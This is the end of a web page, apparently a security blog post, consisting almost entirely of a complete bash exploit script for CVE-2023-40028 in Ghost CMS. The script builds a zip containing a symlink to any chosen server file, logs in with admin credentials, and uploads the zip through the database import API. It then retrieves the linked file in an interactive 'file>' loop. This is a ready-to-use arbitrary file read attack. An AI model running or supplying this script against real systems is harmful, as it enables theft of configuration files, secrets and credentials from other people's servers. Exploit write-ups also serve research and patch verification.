+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  ln</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -s</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $FILE_TO_READ</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/content/images/2024/</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$IMAGE_NAME</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">.png</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  zip</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -r</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -y</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_ZIP_NAME</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> &amp;</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">/dev/null</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> clean</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">{</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  rm</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/content/images/2024/</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$IMAGE_NAME</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">.png</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  rm</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -rf</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  rm</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_ZIP_NAME</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#CREATE COOKIE</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -c</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> username=</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$USERNAME</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> password=</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$PASSWORD</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">   -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Origin: </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">   -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Accept-Version: v3.0"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">   $GHOST_API</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/session/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> &amp;</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> /dev/null</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">if</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> !</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> grep</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -q</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ghost-admin-api-session</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "[!] INVALID USERNAME OR PASSWORD"</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  rm</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  exit</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> send_exploit</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">()</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">{</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">  RES</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -s</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Accept: text/plain, */*; q=0.01"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Accept-Language: en-US,en;q=0.5"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Accept-Encoding: gzip, deflate, br"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "X-Ghost-Version: 5.58"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "App-Pragma: no-cache"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "X-Requested-With: XMLHttpRequest"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Content-Type: multipart/form-data"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -X</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> POST</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Origin: </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Referer: </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/ghost/"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -F</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "importfile=@`</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">dirname</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $PAYLOAD_PATH</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">`/</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$PAYLOAD_ZIP_NAME</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">;type=application/zip"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "form-data; name=</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">importfile</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">; filename=</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$PAYLOAD_ZIP_NAME</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -H</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Content-Type: application/zip"</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">  -J</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \</span></span>
+<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">  "</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/ghost/api/v3/admin/db"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [ </span><span style="--shiki-light:#005CC5;--shiki-dark:#ACAFFF">$?</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -ne</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 0</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ];</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "[!] FAILED TO SEND THE EXPLOIT"</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">    clean</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    exit</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  fi</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "WELCOME TO THE CVE-2023-40028 SHELL"</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">while</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">do</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">  read</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "file&gt; "</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> INPUT</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [[ </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$INPUT</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "exit"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ]]; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "Bye Bye !"</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">    break</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  fi</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [[ </span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$INPUT</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =~</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> \ </span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ]]; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">    continue</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  fi</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> [ </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-z</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $INPUT</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">  ]; </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">then</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">    echo</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "VALUE REQUIRED"</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">    continue</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  fi</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  generate_exploit</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $INPUT</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  send_exploit</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -b</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -s</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $GHOST_URL</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">/content/images/2024/</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">$IMAGE_NAME</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">.png</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">  clean</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">done</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">rm</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> cookie.txt</span></span></code></pre>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
